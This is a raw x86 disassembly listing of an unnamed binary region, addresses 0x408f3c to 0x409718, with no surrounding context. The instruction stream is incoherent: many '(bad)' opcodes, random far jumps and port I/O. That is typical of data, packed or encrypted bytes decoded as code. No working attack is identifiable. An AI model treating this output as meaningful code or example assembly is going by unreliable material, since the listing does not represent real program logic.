  408f3c:	test   DWORD PTR [ebx+0x18a99bfc],esi
  408f42:	call   FWORD PTR [ebx-0x66]
  408f45:	in     al,0xd
  408f47:	xor    cl,BYTE PTR [ecx+edx*1+0x6a95cf44]
  408f4e:	aam    0xb0
  408f50:	pop    eax
  408f51:	imul   edi,DWORD PTR [ebx-0x1791af75],0xc1abe65e
  408f5b:	popf   
  408f5c:	adc    edi,DWORD PTR [eax]
  408f5e:	or     eax,0x903ffebf
  408f63:	aas    
  408f64:	out    dx,eax
  408f65:	mov    eax,ds:0x2b118e2e
  408f6a:	pop    ebp
  408f6b:	(bad)  
  408f6c:	jge    0x408f83
  408f6e:	jnp    0x408f4a
  408f70:	out    0x5e,eax
  408f72:	sbb    eax,0x6bbd3a56
  408f77:	retf   0x1213
  408f7a:	mov    bl,0x4b
  408f7c:	pop    es
  408f7d:	test   BYTE PTR [esi+0x43dd040f],ah
  408f83:	mov    bl,0xf0
  408f85:	sub    ebp,eax
  408f87:	pop    ebp
  408f88:	stc    
  408f89:	or     al,0x7b
  408f8b:	jge    0x408f11
  408f8d:	fdivr  QWORD PTR [eax+ebx*4+0x12ed3a10]
  408f94:	shl    BYTE PTR [esi-0x70],1
  408f97:	test   DWORD PTR ds:[edx],ecx
  408f9a:	scas   eax,DWORD PTR es:[edi]
  408f9b:	jmp    0x408ff0
  408f9d:	loop   0x408f98
  408f9f:	ins    DWORD PTR es:[edi],dx
  408fa0:	xor    edx,DWORD PTR [eax+0xe33101f]
  408fa6:	add    edi,DWORD PTR [esi]
  408fa8:	xchg   DWORD PTR [esi-0x2c319c4b],esi
  408fae:	fcomp  DWORD PTR [esi]
  408fb0:	jmp    0xab5a237d
  408fb5:	cmp    edx,DWORD PTR [eax*1+0x5b99216]
  408fbc:	pop    esp
  408fbd:	push   edx
  408fbe:	push   es
  408fbf:	ds loopne 0x409039
  408fc2:	outs   dx,DWORD PTR ds:[esi]
  408fc3:	add    dl,al
  408fc5:	inc    BYTE PTR [edi]
  408fc7:	out    dx,eax
  408fc8:	xchg   ecx,eax
  408fc9:	fst    QWORD PTR [edx+0x7682944e]
  408fcf:	int3   
  408fd0:	cmova  esi,edi
  408fd3:	dec    ecx
  408fd4:	loop   0x40901b
  408fd6:	mov    DWORD PTR [ebx-0x747e803c],ebp
  408fdc:	cwde   
  408fdd:	mov    edx,0x11f8dc67
  408fe2:	ins    BYTE PTR es:[edi],dx
  408fe3:	aam    0x1c
  408fe5:	mov    edi,0x9c0390ef
  408fea:	aas    
  408feb:	push   cs
  408fec:	xlat   BYTE PTR ds:[ebx]
  408fed:	mov    eax,0xae25b18d
  408ff2:	jb     0x408f81
  408ff4:	adc    eax,0x2cf492ec
  408ff9:	sub    eax,0x3735623e
  408ffe:	add    esi,DWORD PTR [esi+0x1d01fbdf]
  409004:	out    dx,eax
  409005:	imul   eax,DWORD PTR [esi],0xa2e107d9
  40900b:	jno    0x408fd8
  40900d:	fs xchg ebx,eax
  40900f:	(bad)  [esi]
  409011:	mov    ebx,0xc9236f34
  409016:	sub    BYTE PTR [ebp+0x6fca1aaa],ah
  40901c:	push   cs
  40901d:	std    
  40901e:	add    dh,BYTE PTR [ebx+0x2dfb2049]
  409024:	out    0x75,al
  409026:	sub    eax,DWORD PTR [edx-0x4ad8d185]
  40902c:	int3   
  40902d:	shl    DWORD PTR [edx+edx*2],1
  409030:	push   eax
  409031:	inc    di
  409033:	cmp    ah,BYTE PTR [esi+edx*8+0x1d82a84e]
  40903a:	or     BYTE PTR [ebp-0x358381b4],al
  409040:	and    BYTE PTR [di],dh
  409043:	pop    ebp
  409044:	jmp    0xb77a:0xe7507954
  40904b:	mov    cl,0xd5
  40904d:	dec    edi
  40904e:	mov    WORD PTR ds:0x398cf9c7,ds
  409054:	leave  
  409055:	les    edi,FWORD PTR [edx+edi*8-0x1c]
  409059:	push   esp
  40905a:	add    DWORD PTR [esi],0xc
  40905d:	mov    cl,dl
  40905f:	adc    al,0xb2
  409061:	inc    ebx
  409062:	push   ds
  409063:	cmc    
  409064:	sbb    BYTE PTR [ebx-0x48],bh
  409067:	sub    BYTE PTR [ebp+0x19e054a8],cl
  40906d:	sbb    al,0xae
  40906f:	pop    ebp
  409070:	retf   0x1318
  409073:	mov    al,ds:0x4dc56a9f
  409078:	stc    
  409079:	aad    0x1c
  40907b:	pop    edx
  40907c:	fcomp  st(4)
  40907e:	xchg   BYTE PTR [ebp-0x5f],ch
  409081:	sbb    esi,ebx
  409083:	ret    
  409084:	xor    al,0xc9
  409086:	mov    ch,BYTE PTR [eax+ebp*2-0x2338d108]
  40908d:	in     eax,0x7b
  40908f:	pop    eax
  409090:	in     al,dx
  409091:	and    eax,0x6aef2660
  409096:	mov    edx,0x836ccf43
  40909b:	(bad)  
  40909c:	fwait
  40909d:	ret    
  40909e:	dec    ecx
  40909f:	dec    edx
  4090a0:	sub    dh,BYTE PTR [ecx-0x3f]
  4090a3:	out    0x87,eax
  4090a5:	dec    edx
  4090a6:	mov    edi,0xd4c2d215
  4090ab:	leave  
  4090ac:	arpl   bp,bx
  4090ae:	inc    esi
  4090af:	hlt    
  4090b0:	and    BYTE PTR [edx+0x389caa1e],ch
  4090b6:	dec    esp
  4090b7:	mov    eax,fs
  4090b9:	dec    edx
  4090ba:	repnz loope 0x4090c7
  4090bd:	imul   esi,DWORD PTR [eax-0x5888aea4],0x2044900d
  4090c7:	shl    BYTE PTR [ebx],1
  4090c9:	xor    ebp,DWORD PTR [eax+0x258f5086]
  4090cf:	sub    al,0xcc
  4090d1:	repz add BYTE PTR [esi-0x10],ch
  4090d5:	jns    0x40912c
  4090d7:	push   0x52eee26a
  4090dc:	push   ss
  4090dd:	mov    bh,0xca
  4090df:	gs out dx,al
  4090e1:	pop    es
  4090e2:	mov    ds:0x898ac5a5,al
  4090e7:	data16 (bad) 
  4090e9:	shl    BYTE PTR [edi-0x74],cl
  4090ec:	stos   DWORD PTR es:[edi],eax
  4090ed:	pop    esi
  4090ee:	mov    edx,0x1bc1de81
  4090f3:	add    bh,BYTE PTR [eax+0x785e40d3]
  4090f9:	or     eax,0x441313cd
  4090fe:	pop    esi
  4090ff:	mov    bl,0x5a
  409101:	cdq    
  409102:	popa   
  409103:	mov    dl,BYTE PTR [ecx-0x48]
  409106:	mov    ds:0xc266f611,eax
  40910b:	inc    esp
  40910c:	scas   eax,DWORD PTR es:[edi]
  40910d:	mov    al,ds:0x588e9129
  409112:	aad    0x14
  409114:	cmp    ebx,DWORD PTR ds:0xc3a55e52
  40911a:	xchg   edi,eax
  40911b:	sti    
  40911c:	dec    ebp
  40911d:	adc    ecx,DWORD PTR [eax-0x10]
  409120:	or     eax,DWORD PTR [esi*4-0x4bb1fe0f]
  409127:	les    ecx,FWORD PTR [esi]
  409129:	retf   
  40912a:	outs   dx,DWORD PTR ds:[esi]
  40912b:	or     DWORD PTR [esi+0x3f],ecx
  40912e:	shr    DWORD PTR [edi],cl
  409130:	jg     0x4090fc
  409132:	test   DWORD PTR [eax],ebx
  409134:	sbb    edx,esp
  409136:	and    bl,BYTE PTR [edx]
  409138:	push   es
  409139:	cwde   
  40913a:	(bad)  
  40913b:	(bad)  
  40913c:	jno    0x409138
  40913e:	pop    ebp
  40913f:	mov    WORD PTR [esi+0x5f],fs
  409142:	pushf  
  409143:	mov    al,0xec
  409145:	retf   0x4507
  409148:	fisttp WORD PTR [esi-0xb]
  40914b:	and    BYTE PTR [edx+edx*8+0x37d8b869],al
  409152:	retf   0xb0e4
  409155:	add    ah,BYTE PTR [edi]
  409157:	je     0x4090e0
  409159:	sbb    eax,0x57a8b1a9
  40915e:	push   ebx
  40915f:	stos   BYTE PTR es:[edi],al
  409160:	dec    esp
  409161:	sbb    BYTE PTR [ecx-0x53],ah
  409164:	push   eax
  409165:	rcr    edi,0xe1
  409168:	jmp    0x4091d4
  40916a:	push   es
  40916b:	xchg   ebx,eax
  40916c:	and    ebx,DWORD PTR ds:0x5dc6697e
  409172:	pop    es
  409173:	inc    edi
  409174:	iret   
  409175:	jo     0x409154
  409177:	adc    bh,BYTE PTR [eax+0x666b760]
  40917d:	jl     0x40911f
  40917f:	cli    
  409180:	sub    dl,BYTE PTR [ecx+0x70]
  409183:	xor    esi,edi
  409185:	dec    eax
  409186:	dec    ecx
  409187:	xchg   esi,eax
  409188:	push   ecx
  409189:	push   ss
  40918a:	pop    ds
  40918b:	push   ss
  40918c:	sti    
  40918d:	bound  esi,QWORD PTR [edi]
  40918f:	mov    dh,0xf0
  409191:	add    eax,0x5fcf3d99
  409196:	fiadd  DWORD PTR [edi]
  409198:	(bad)  
  40919a:	cmp    al,0xff
  40919c:	mov    ds:0x654a529f,eax
  4091a1:	dec    ebp
  4091a2:	ja     0x409171
  4091a4:	adc    eax,ebx
  4091a6:	dec    ecx
  4091a7:	scas   eax,DWORD PTR es:[edi]
  4091a8:	(bad)  
  4091a9:	jmp    0x65715b95
  4091ae:	sbb    bl,ch
  4091b0:	xor    eax,0x5714a766
  4091b5:	loopne 0x4091ae
  4091b7:	add    al,0x6a
  4091b9:	and    BYTE PTR [esi-0x6a384948],ch
  4091bf:	outs   dx,DWORD PTR ds:[esi]
  4091c0:	sub    dh,bh
  4091c2:	xor    BYTE PTR [ecx],0xfd
  4091c5:	inc    esi
  4091c6:	xchg   esp,eax
  4091c7:	sti    
  4091c8:	inc    esi
  4091c9:	test   dl,0xf7
  4091cc:	scas   eax,DWORD PTR es:[edi]
  4091cd:	fsubr  st(5),st
  4091cf:	popa   
  4091d0:	sub    al,0xf7
  4091d2:	dec    edx
  4091d3:	push   ds
  4091d4:	imul   DWORD PTR [esi-0x1e43ffc4]
  4091da:	imul   ebp,DWORD PTR [ecx-0xb],0xf437d1d1
  4091e1:	(bad)  
  4091e3:	cli    
  4091e4:	dec    edi
  4091e5:	mov    bh,0x17
  4091e7:	xor    DWORD PTR [ebx+esi*1+0x1c],0x3472bb60
  4091ef:	icebp  
  4091f0:	sbb    ebx,eax
  4091f2:	mul    al
  4091f4:	mov    esi,0x4aba6306
  4091f9:	js     0x409201
  4091fb:	(bad)  
  4091fc:	jl     0x40917f
  4091fe:	frstor [ebx+edx*2-0x80]
  409202:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409203:	jno    0x4091c4
  409205:	scas   eax,DWORD PTR es:[edi]
  409206:	pop    ds
  409207:	icebp  
  409208:	push   eax
  409209:	sbb    ebx,0xfffffff9
  40920c:	dec    esi
  40920d:	test   BYTE PTR [esp+eax*8-0x58],dl
  409211:	and    DWORD PTR ds:0xc999232f,ebp
  409217:	jno    0x4091e2
  409219:	cmp    eax,0xa6d71dab
  40921e:	mov    bl,0x3b
  409220:	sub    BYTE PTR [edi],0x6d
  409223:	outs   dx,BYTE PTR ds:[esi]
  409224:	fld    QWORD PTR [eax]
  409226:	rcr    BYTE PTR [ebx+eax*8],1
  409229:	cmp    DWORD PTR [ebx+ebp*2+0x62],0xc1e5eac1
  409231:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409232:	cwde   
  409233:	mov    BYTE PTR [edx+esi*8-0x5452ffd7],dl
  40923a:	scas   al,BYTE PTR es:[edi]
  40923b:	gs cld 
  40923d:	jnp    0x409231
  40923f:	cli    
  409240:	ficom  WORD PTR [esi-0x2b]
  409243:	sub    DWORD PTR [ebx-0x29],ebp
  409246:	xlat   BYTE PTR ds:[ebx]
  409247:	cmp    al,0x77
  409249:	mov    edx,0xb2f0140a
  40924e:	sub    eax,0xc7f9fffa
  409253:	sub    eax,0x4c3b163c
  409258:	out    0x3e,al
  40925a:	loop   0x4092bb
  40925c:	sahf   
  40925d:	jbe    0x4092a3
  40925f:	add    esp,DWORD PTR [ebx]
  409261:	pop    ebx
  409262:	inc    esi
  409263:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  409265:	out    dx,al
  409266:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409267:	cmp    al,0x5
  409269:	xlat   BYTE PTR ds:[ebx]
  40926a:	into   
  40926b:	mov    es,WORD PTR [edx+0x4b]
  40926e:	sub    DWORD PTR [edi],eax
  409270:	xchg   ebx,eax
  409271:	sub    dl,cl
  409273:	sub    DWORD PTR ds:0x1a011a59,eax
  409279:	retf   0x3b46
  40927c:	adc    dh,BYTE PTR [edi+0x5a]
  40927f:	fcomip st,st(4)
  409281:	push   edx
  409282:	shl    ecx,cl
  409284:	bound  ebp,QWORD PTR [ebp-0x7c]
  409287:	mov    eax,ds:0x69a797d4
  40928c:	clc    
  40928d:	sbb    eax,0x5221a981
  409292:	pop    esp
  409293:	sbb    DWORD PTR [edx+0x32],eax
  409296:	iret   
  409297:	lahf   
  409298:	sbb    eax,0x8c859bc4
  40929d:	add    DWORD PTR [ebx],edi
  40929f:	scas   eax,DWORD PTR es:[edi]
  4092a0:	push   ecx
  4092a1:	xlat   BYTE PTR ds:[ebx]
  4092a2:	sbb    BYTE PTR [edi+0x7ac5af74],ch
  4092a8:	cmp    eax,0x12682c15
  4092ad:	lahf   
  4092ae:	jo     0x4092eb
  4092b0:	sub    cl,BYTE PTR [ebx]
  4092b2:	das    
  4092b3:	in     eax,dx
  4092b4:	fnstcw WORD PTR [ecx-0x6b]
  4092b7:	cmp    ebp,DWORD PTR [edi-0x4055f282]
  4092bd:	xor    al,0xce
  4092bf:	mov    eax,0xde5a3c0f
  4092c4:	pop    ebp
  4092c5:	sbb    dl,al
  4092c7:	jbe    0x4092ea
  4092c9:	sub    ch,BYTE PTR [edi-0x6d]
  4092cc:	js     0x4092cf
  4092ce:	inc    ebp
  4092cf:	mov    ah,0xd8
  4092d1:	sbb    ecx,ecx
  4092d3:	and    edx,edi
  4092d5:	pop    ss
  4092d6:	push   ss
  4092d7:	sbb    dl,cl
  4092d9:	lock lock std 
  4092dc:	sub    BYTE PTR [eax-0x2b],al
  4092df:	mov    cs,ebp
  4092e1:	adc    BYTE PTR [edx],al
  4092e3:	rcr    DWORD PTR [ebp-0x7abf03c3],0x34
  4092ea:	fist   DWORD PTR [edi-0x29]
  4092ed:	aaa    
  4092ee:	(bad)  
  4092ef:	out    0xeb,al
  4092f1:	gs ins BYTE PTR es:[edi],dx
  4092f3:	mov    esi,0xc10df289
  4092f8:	and    esp,DWORD PTR [esi+eax*2-0x2cb73409]
  4092ff:	sub    DWORD PTR [edx],ebp
  409301:	mov    ecx,0xd1a54373
  409306:	sub    al,0xd7
  409308:	sahf   
  409309:	and    cl,BYTE PTR [ebx]
  40930b:	sahf   
  40930c:	mov    ch,0xeb
  40930e:	repnz enter 0x9ded,0x77
  409313:	hlt    
  409314:	dec    edx
  409315:	or     eax,0xd1c9adb2
  40931a:	push   ss
  40931b:	iret   
  40931c:	push   es
  40931d:	pop    ds
  40931e:	sub    BYTE PTR [ebx],0x46
  409321:	push   cs
  409322:	add    eax,0xcecc9df7
  409327:	xchg   edx,eax
  409328:	pop    ebx
  409329:	add    DWORD PTR [ecx],edi
  40932b:	jl     0x40936e
  40932d:	push   ss
  40932e:	mov    WORD PTR [ebp+0x44],es
  409331:	popf   
  409332:	mov    esi,0x89d832ba
  409337:	out    dx,al
  409338:	std    
  409339:	mov    eax,0x1a8d5636
  40933e:	mov    BYTE PTR [ebx+0x163d2af6],dl
  409344:	add    DWORD PTR [edi-0x186d99a6],0x958a4ed2
  40934e:	push   0x2bf3b245
  409353:	in     eax,dx
  409354:	sub    bh,dh
  409356:	out    dx,al
  409357:	mov    BYTE PTR [edx+0xa2211f9],dh
  40935d:	adc    DWORD PTR [eax-0x565dbb7b],esi
  409363:	push   ss
  409364:	in     eax,dx
  409365:	jmp    0x50ae:0x1c6e1845
  40936c:	push   es
  40936d:	jmp    0x81c8cdaf
  409372:	ret    
  409373:	sub    ebx,DWORD PTR [eax]
  409375:	xchg   eax,esp
  409377:	call   0xf994:0x810d5c58
  40937e:	xchg   esp,eax
  40937f:	(bad)  
  409380:	sti    
  409381:	test   DWORD PTR [ebp+0x626ff05e],ebp
  409387:	(bad)  
  409388:	out    0x44,al
  40938a:	dec    esi
  40938b:	mov    ebx,0x71863a57
  409390:	mov    al,0x12
  409392:	imul   esi,DWORD PTR [ebx+0x2c6c6ac5],0x26656e8a
  40939c:	pop    eax
  40939d:	shl    eax,0x58
  4093a0:	push   ebx
  4093a1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4093a2:	in     al,dx
  4093a3:	xchg   ebp,eax
  4093a4:	xor    eax,0x60987b30
  4093a9:	jno    0x409387
  4093ab:	mov    ds:0x30f8ec1,eax
  4093b0:	mov    esp,0x61fb131b
  4093b5:	iret   
  4093b6:	(bad)  
  4093b7:	push   edi
  4093b8:	cmovl  ebp,DWORD PTR [ebp-0x7]
  4093bc:	repz addr16 mov cl,0x99
  4093c0:	adc    bh,BYTE PTR [esi]
  4093c2:	and    eax,DWORD PTR [ebp+ebx*2-0x24]
  4093c6:	fdiv   QWORD PTR [edi-0x5e]
  4093c9:	adc    BYTE PTR [ecx],dl
  4093cb:	in     eax,dx
  4093cc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4093cd:	jmp    0x4093ea
  4093cf:	cdq    
  4093d0:	les    esi,FWORD PTR [edi+0x22f1eb6e]
  4093d6:	xchg   ecx,eax
  4093d7:	adc    al,0x27
  4093d9:	mov    ds:0x34de62e9,al
  4093de:	dec    edx
  4093df:	test   eax,0xd4b5ad35
  4093e4:	sbb    al,0x49
  4093e6:	xor    al,BYTE PTR [ebx+0x2fa4d0c]
  4093ec:	lock fs into 
  4093ef:	cld    
  4093f0:	ret    0xc89f
  4093f3:	push   edx
  4093f4:	icebp  
  4093f5:	cmc    
  4093f6:	dec    ebp
  4093f7:	stc    
  4093f8:	push   ecx
  4093f9:	pop    eax
  4093fa:	out    0x70,eax
  4093fc:	(bad)  [ebx-0x4e]
  4093ff:	jo     0x409411
  409401:	lods   eax,DWORD PTR ds:[esi]
  409402:	fs stos DWORD PTR es:[edi],eax
  409404:	mov    ah,0x7a
  409406:	pushf  
  409407:	jnp    0x40938e
  409409:	out    dx,al
  40940a:	push   cs
  40940b:	sti    
  40940c:	sbb    al,0xa0
  40940e:	mov    eax,0x3ffe5f1f
  409413:	jge    0x4093d6
  409415:	repz mov bl,0xc3
  409418:	imul   ebp,DWORD PTR [ecx],0x3b3c0005
  40941e:	xor    BYTE PTR [esi],dh
  409420:	lock arpl WORD PTR [ecx],ax
  409423:	inc    bl
  409425:	addr16 aaa 
  409427:	sub    eax,esp
  409429:	test   al,0x67
  40942b:	dec    edx
  40942c:	out    dx,eax
  40942d:	add    ecx,ebp
  40942f:	push   0x9f6b9bd8
  409434:	test   DWORD PTR [eax],0x98b532b2
  40943a:	fild   DWORD PTR [esi+0x3d2686e1]
  409440:	loopne 0x409406
  409442:	sbb    al,0x60
  409444:	jge    0x409410
  409446:	arpl   WORD PTR [edx],di
  409448:	fsubrp st(3),st
  40944a:	pop    ebp
  40944b:	out    0x80,al
  40944d:	mov    bl,0x60
  40944f:	pop    edi
  409450:	mov    esi,gs
  409452:	and    edx,DWORD PTR [esi-0x62]
  409455:	fmul   DWORD PTR [ebx-0x39]
  409458:	cmp    eax,edi
  40945a:	test   eax,0x89c804d2
  40945f:	test   DWORD PTR [edx],0x2c63eeb7
  409465:	out    dx,al
  409466:	inc    esp
  409467:	jbe    0x40944c
  409469:	xor    al,0x84
  40946b:	stos   DWORD PTR es:[edi],eax
  40946c:	lahf   
  40946d:	loope  0x40949d
  40946f:	gs pop es
  409471:	lock add edx,DWORD PTR [eax]
  409474:	fbstp  TBYTE PTR [edi-0x1f]
  409477:	xchg   esp,eax
  409478:	push   eax
  409479:	in     eax,0x50
  40947b:	test   cl,bl
  40947d:	dec    esp
  40947e:	out    dx,al
  40947f:	bound  edx,QWORD PTR [ebx+esi*8+0x14]
  409483:	xor    DWORD PTR [edx],eax
  409485:	lock push esp
  409487:	mov    DWORD PTR [edi-0x16a8b4d9],0x6f128d6b
  409491:	fmul   st,st(2)
  409493:	pop    ss
  409494:	and    edi,DWORD PTR [eax+esi*4-0x1e]
  409498:	mov    cl,0x52
  40949a:	(bad)  
  40949b:	in     eax,dx
  40949c:	fild   WORD PTR [ecx-0x62]
  40949f:	nop
  4094a0:	add    DWORD PTR [ebx+0x1dcfefb],0x83537f09
  4094aa:	xchg   esp,eax
  4094ab:	outs   dx,BYTE PTR ds:[esi]
  4094ac:	inc    esp
  4094ad:	xchg   ebx,eax
  4094ae:	push   es
  4094af:	nop
  4094b0:	out    dx,eax
  4094b1:	ds (bad) 
  4094b3:	mov    bh,0xa4
  4094b5:	push   ebx
  4094b6:	arpl   WORD PTR [esi+0x59],sp
  4094b9:	sbb    al,0x33
  4094bb:	mov    ah,0xa8
  4094bd:	pop    eax
  4094be:	cmp    eax,0xef40805
  4094c3:	push   ds
  4094c4:	lds    ecx,FWORD PTR [esi+ebp*2-0x46c945aa]
  4094cb:	loopne 0x409500
  4094cd:	(bad)  
  4094ce:	aam    0xce
  4094d0:	xchg   esi,eax
  4094d1:	xor    DWORD PTR [edx],edi
  4094d3:	daa    
  4094d4:	mov    bh,0x52
  4094d6:	add    ebx,DWORD PTR [edi+ebp*4-0x4fce23a2]
  4094dd:	sub    al,0xf1
  4094df:	xchg   ebp,eax
  4094e0:	test   bh,dh
  4094e2:	nop
  4094e3:	jge    0x409466
  4094e5:	sahf   
  4094e6:	ss iret 
  4094e8:	xor    al,BYTE PTR ds:0xabbbeeb1
  4094ee:	mov    edi,0xf3c84942
  4094f3:	inc    edx
  4094f4:	xchg   ebp,eax
  4094f5:	in     eax,0xf4
  4094f7:	(bad)  
  4094f8:	out    0x30,al
  4094fa:	fild   WORD PTR [ecx-0xa]
  4094fd:	mov    esi,ecx
  4094ff:	mov    ebx,0xbb9a7033
  409504:	fdiv   DWORD PTR [ecx-0x6ac80a45]
  40950a:	pop    eax
  40950b:	fmul   DWORD PTR [esi-0x63]
  40950e:	inc    esi
  40950f:	xchg   ecx,edx
  409511:	cmp    DWORD PTR [esi],ecx
  409513:	lea    eax,[esi-0x37]
  409516:	aam    0x8f
  409518:	jge    0x4094eb
  40951a:	push   eax
  40951b:	aad    0xc1
  40951d:	(bad)  
  40951e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40951f:	push   ebp
  409520:	inc    BYTE PTR [ebp+0x64]
  409523:	inc    ebx
  409524:	les    edx,FWORD PTR [ebx]
  409526:	mul    BYTE PTR [ebx]
  409528:	cmc    
  409529:	gs clc 
  40952b:	fsub   QWORD PTR [ecx-0x7d]
  40952e:	cwde   
  40952f:	mov    dh,0xee
  409531:	(bad)  
  409532:	jno    0x4094b5
  409534:	shl    BYTE PTR [edx],1
  409536:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409537:	es add eax,0xf9d673ff
  40953d:	add    DWORD PTR [ecx],ebp
  40953f:	stos   DWORD PTR es:[edi],eax
  409540:	mov    ecx,0xaf9845f6
  409545:	pop    ss
  409546:	inc    ebx
  409547:	sbb    al,0x8a
  409549:	mov    ds:0xc6f68f3b,al
  40954e:	mov    eax,0x944f2565
  409553:	icebp  
  409554:	je     0x409543
  409556:	not    DWORD PTR [eax+0x20]
  409559:	into   
  40955a:	sbb    dl,0xfa
  40955d:	mov    ebp,0xe59948e7
  409562:	push   ss
  409563:	xchg   esp,eax
  409564:	adc    al,0xb6
  409566:	sbb    DWORD PTR [eax],ebx
  409568:	or     ecx,DWORD PTR [ecx]
  40956a:	jb     0x4095ca
  40956c:	in     eax,dx
  40956d:	dec    ecx
  40956e:	and    BYTE PTR [ecx+eax*8-0x28],0x69
  409573:	sbb    esi,DWORD PTR [ebp+ebp*2+0x47]
  409577:	rcl    bl,0x81
  40957a:	repz cld 
  40957c:	aad    0xe2
  40957e:	jmp    0xd0eb:0x5001a369
  409585:	push   cs
  409586:	fcomp  QWORD PTR [eax+ebx*2-0x3f]
  40958a:	ficomp WORD PTR [ebp+0x6f]
  40958d:	std    
  40958e:	jmp    0x4095a1
  409590:	sbb    BYTE PTR [ebx+0x266f44b5],bh
  409596:	inc    ebp
  409597:	and    edx,DWORD PTR [edi]
  409599:	fmul   DWORD PTR [edi-0x40190598]
  40959f:	iret   
  4095a0:	shr    BYTE PTR [esi-0x44c04465],1
  4095a6:	(bad)  
  4095a7:	mov    bl,BYTE PTR [ebx-0x67]
  4095aa:	push   ds
  4095ab:	fisubr WORD PTR [esi+0x2f66ec38]
  4095b1:	ss xchg edx,eax
  4095b3:	ret    
  4095b4:	adc    eax,0x4c92c0f5
  4095b9:	ror    BYTE PTR [ebx-0xcade5a8],0xea
  4095c0:	push   0xffffffa1
  4095c2:	xor    eax,0x22a39ebb
  4095c7:	xor    BYTE PTR [ebp+esi*1+0x51886e13],bl
  4095ce:	aad    0x5a
  4095d0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4095d1:	mov    ch,0xbd
  4095d3:	adc    esp,DWORD PTR [ecx-0x2c]
  4095d6:	xchg   BYTE PTR [ecx+0x1e],bl
  4095d9:	push   edi
  4095da:	pop    ds
  4095db:	jp     0x4095da
  4095dd:	pop    esp
  4095de:	outs   dx,BYTE PTR ds:[esi]
  4095df:	jle    0x409648
  4095e1:	(bad)
  4095e5:	jp     0x40961d
  4095e7:	jg     0x409648
  4095e9:	adc    DWORD PTR [edi],0x192d178b
  4095ef:	and    cl,BYTE PTR [ecx-0x79]
  4095f2:	gs aad 0x3c
  4095f5:	out    0x23,eax
  4095f7:	pop    ecx
  4095f8:	sub    al,0x7b
  4095fa:	push   esp
  4095fb:	aam    0x75
  4095fd:	pop    ebp
  4095fe:	addr16 fmul st,st(7)
  409601:	sub    DWORD PTR [ebx+0x4c],ecx
  409604:	inc    esi
  409605:	mov    esp,0x7b97b182
  40960a:	ret    0xfd2b
  40960d:	lock test BYTE PTR [edi-0x7c],bh
  409611:	arpl   bx,ax
  409613:	je     0x409664
  409615:	mov    esp,0xda0f4c
  40961a:	or     eax,0xaf2ede09
  40961f:	popa   
  409620:	int3   
  409621:	pop    ebx
  409622:	pop    edi
  409623:	call   0x6d6b:0xa56edae1
  40962a:	cmp    DWORD PTR [esp+eax*4+0x49],edi
  40962e:	jge    0x40962a
  409630:	retf   0x182
  409633:	dec    edi
  409634:	xchg   esp,eax
  409635:	aad    0xf8
  409637:	lahf   
  409638:	or     BYTE PTR [edx-0x21],bl
  40963b:	xchg   BYTE PTR [edx+0x27988301],al
  409641:	mov    bl,0x99
  409643:	int3   
  409644:	in     eax,0x66
  409646:	aam    0xf5
  409648:	scas   eax,DWORD PTR es:[edi]
  409649:	(bad)  
  40964a:	std    
  40964b:	inc    eax
  40964c:	mov    eax,ds:0x34e0e2b2
  409651:	xor    BYTE PTR [ebx+0x7ef9d7e],dl
  409657:	mov    ds:0x9050212a,eax
  40965c:	aad    0xa1
  40965e:	loop   0x409671
  409660:	cmc    
  409661:	jbe    0x4095f5
  409663:	sub    al,0xf7
  409665:	arpl   ax,ax
  409667:	xchg   edi,eax
  409668:	pop    esp
  409669:	jno    0x409610
  40966b:	out    0x2a,eax
  40966d:	jmp    0x8fa9870f
  409672:	loope  0x409601
  409674:	mov    esp,DWORD PTR [eax]
  409676:	or     ebp,DWORD PTR ss:[edx]
  409679:	int3   
  40967a:	jg     0x40965a
  40967c:	out    dx,eax
  40967d:	cmc    
  40967e:	mov    BYTE PTR [ebp-0x3b],0x0
  409682:	jecxz  0x409682
  409684:	mov    al,ds:0x6198903
  409689:	stos   DWORD PTR es:[edi],eax
  40968a:	xchg   ebx,eax
  40968b:	aaa    
  40968c:	test   al,0x2c
  40968e:	repz sub eax,0xfcde6b85
  409694:	jne    0x409634
  409696:	popa   
  409697:	add    BYTE PTR [esi-0x31],al
  40969a:	push   0xfffffff7
  40969c:	addr16 cmp eax,0x408ffdea
  4096a2:	jnp    0x4096e9
  4096a4:	scas   al,BYTE PTR es:[edi]
  4096a5:	or     DWORD PTR ds:0x42ecdb5e,0xffffff96
  4096ac:	sub    bl,BYTE PTR [ebx-0x51681661]
  4096b2:	mov    dl,0x28
  4096b4:	ficom  WORD PTR [edx+ebp*2-0x37]
  4096b8:	and    BYTE PTR [ecx],cl
  4096ba:	retf   
  4096bb:	dec    ebx
  4096bc:	xchg   BYTE PTR [eax],bh
  4096be:	icebp  
  4096bf:	push   ebp
  4096c0:	retf   
  4096c1:	fisttp WORD PTR [edi]
  4096c3:	inc    esi
  4096c4:	jmp    0x4096e0
  4096c6:	adc    eax,0xa005e390
  4096cb:	push   ss
  4096cc:	ficom  DWORD PTR [ecx-0x6bf1a57c]
  4096d2:	sbb    DWORD PTR [edx-0x2bb72276],0xffffffbb
  4096d9:	xchg   DWORD PTR [edx-0x47],ebp
  4096dc:	in     eax,dx
  4096dd:	lods   eax,DWORD PTR ds:[esi]
  4096de:	jb     0x4096e4
  4096e0:	mov    ah,0xc
  4096e2:	ja     0x4096d5
  4096e4:	(bad)  
  4096e5:	jmp    0x40971d
  4096e7:	outs   dx,DWORD PTR ds:[esi]
  4096e8:	mov    ss,WORD PTR [esi+0x49]
  4096eb:	adc    eax,0xfb2cacc9
  4096f0:	gs pop eax
  4096f2:	cmp    DWORD PTR [ecx+0x7c],edi
  4096f5:	ds jge 0x4096df
  4096f8:	repz sub eax,0x64cdb5b8
  4096fe:	sbb    ecx,ebx
  409700:	gs pop esi
  409702:	scas   al,BYTE PTR es:[edi]
  409703:	mov    bl,0xad
  409705:	sub    al,0xa7
  409707:	jmp    0x6f86132f
  40970c:	(bad)  [edx]
  40970e:	mov    ecx,0xeae45181
  409713:	inc    esi
  409714:	sub    al,bl
  409716:	push   ebp
  409717:	push   eax
  409718:	les    edi,FWORD PTR [eax+0x29d3904]
